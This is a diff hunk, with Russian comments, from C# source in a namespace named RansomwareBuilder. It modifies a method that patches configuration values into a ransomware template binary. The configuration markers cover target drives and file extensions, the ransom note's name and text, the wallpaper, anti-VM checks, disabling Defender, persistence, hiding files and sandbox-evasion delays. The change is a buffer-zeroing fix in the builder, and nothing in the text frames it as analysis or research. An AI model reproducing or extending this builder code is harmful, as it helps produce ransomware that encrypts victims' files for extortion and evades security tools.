@@ -767,61 +767,65 @@ namespace RansomwareBuilder
         // МЕТОД ПАТЧИНГА (ИСПРАВЛЕННАЯ ВЕРСИЯ — С ОБНУЛЕНИЕМ БУФЕРА)
         // ============================================================
         private void PatchVariable(byte[] data, string marker, string value)
+{
+    byte[] markerBytes = Encoding.ASCII.GetBytes(marker);
+    byte[] valueBytes = Encoding.ASCII.GetBytes(value + "\0");
+    
+    // ============================================================
+    // ЖЕСТКИЕ РАЗМЕРЫ БУФЕРОВ (из template.cpp)
+    // ============================================================
+    int maxLen = 256;
+    
+    if (marker.Contains("DRIVES")) maxLen = 512;
+    else if (marker.Contains("EXTS")) maxLen = 2048;
+    else if (marker.Contains("EXCLUDE") || marker.Contains("INCLUDE")) maxLen = 1024;
+    else if (marker.Contains("ENC_EXT")) maxLen = 32;
+    else if (marker.Contains("NOTE_NAME") || marker.Contains("FAKE_NAME")) maxLen = 64;
+    else if (marker.Contains("NOTE_CONTENT")) maxLen = 4096;
+    else if (marker.Contains("WALL_BASE64")) maxLen = 16384;
+    else if (marker.Contains("WALL_EXT")) maxLen = 16;
+    else if (marker.Contains("ALGO") || marker.Contains("ENABLED") || 
+             marker.Contains("ANTI_VM") || marker.Contains("DEFENDER") ||
+             marker.Contains("PERSISTENCE") || marker.Contains("HIDE_FILES") ||
+             marker.Contains("SANDBOX_DELAY"))
+    {
+        maxLen = 2;
+    }
+    
+    for (int i = 0; i < data.Length - markerBytes.Length; i++)
+    {
+        bool found = true;
+        for (int j = 0; j < markerBytes.Length; j++)
         {
-            byte[] markerBytes = Encoding.ASCII.GetBytes(marker);
-            byte[] valueBytes = Encoding.ASCII.GetBytes(value + "\0");
-            
-            // ============================================================
-            // ЖЕСТКИЕ РАЗМЕРЫ БУФЕРОВ (из template.cpp)
-            // ============================================================
-            int maxLen = 256; // значение по умолчанию
-            
-            if (marker.Contains("DRIVES")) maxLen = 512;
-            else if (marker.Contains("EXTS")) maxLen = 2048;
-            else if (marker.Contains("EXCLUDE") || marker.Contains("INCLUDE")) maxLen = 1024;
-            else if (marker.Contains("ENC_EXT")) maxLen = 32;
-            else if (marker.Contains("NOTE_NAME") || marker.Contains("FAKE_NAME")) maxLen = 64;
-            else if (marker.Contains("NOTE_CONTENT")) maxLen = 4096;
-            else if (marker.Contains("WALL_BASE64")) maxLen = 16384;
-            else if (marker.Contains("WALL_EXT")) maxLen = 16;
-            else if (marker.Contains("ALGO") || marker.Contains("ENABLED") || 
-                     marker.Contains("ANTI_VM") || marker.Contains("DEFENDER") ||
-                     marker.Contains("PERSISTENCE") || marker.Contains("HIDE_FILES") ||
-                     marker.Contains("SANDBOX_DELAY"))
-            {
-                maxLen = 2; // char + нуль-терминатор
-            }
-            
-            for (int i = 0; i < data.Length - markerBytes.Length; i++)
-            {
-                bool found = true;
-                for (int j = 0; j < markerBytes.Length; j++)
-                {
-                    if (data[i + j] != markerBytes[j]) { found = false; break; }
-                }
-                if (found)
-                {
-                    int start = i + markerBytes.Length;
-                    
-                    // ============================================================
-                    // ВАЖНО: СНАЧАЛА ОБНУЛЯЕМ ВЕСЬ БУФЕР
-                    // Это предотвращает затирание следующего маркера
-                    // ============================================================
-                    for (int k = start; k < start + maxLen; k++)
-                        data[k] = 0;
-                    
-                    // ============================================================
-                    // ПОТОМ КОПИРУЕМ ЗНАЧЕНИЕ
-                    // ============================================================
-                    int copyLen = Math.Min(valueBytes.Length, maxLen);
-                    Array.Copy(valueBytes, 0, data, start, copyLen);
-                    
-                    return;
-                }
-            }
-            
-            MessageBox.Show($"Warning: Marker '{marker}' not found in template!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            if (data[i + j] != markerBytes[j]) { found = false; break; }
         }
+        if (found)
+        {
+            int start = i + markerBytes.Length;
+            
+            // ============================================================
+            // ВАЖНО: НЕ ОБНУЛЯЕМ ВЕСЬ БУФЕР, А ТОЛЬКО ЕГО ЧАСТЬ
+            // Мы НЕ можем обнулять весь буфер, потому что за ним может
+            // идти следующий маркер!
+            // ============================================================
+            
+            // Сначала копируем значение
+            int copyLen = Math.Min(valueBytes.Length, maxLen);
+            Array.Copy(valueBytes, 0, data, start, copyLen);
+            
+            // Обнуляем только остаток буфера (от конца строки до конца буфера)
+            int remaining = maxLen - copyLen;
+            for (int k = 0; k < remaining; k++)
+            {
+                data[start + copyLen + k] = 0;
+            }
+            
+            return;
+        }
+    }
+    
+    MessageBox.Show($"Warning: Marker '{marker}' not found in template!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+}
         
         // ============================================================
         // ОСНОВНАЯ ЛОГИКА СБОРКИ
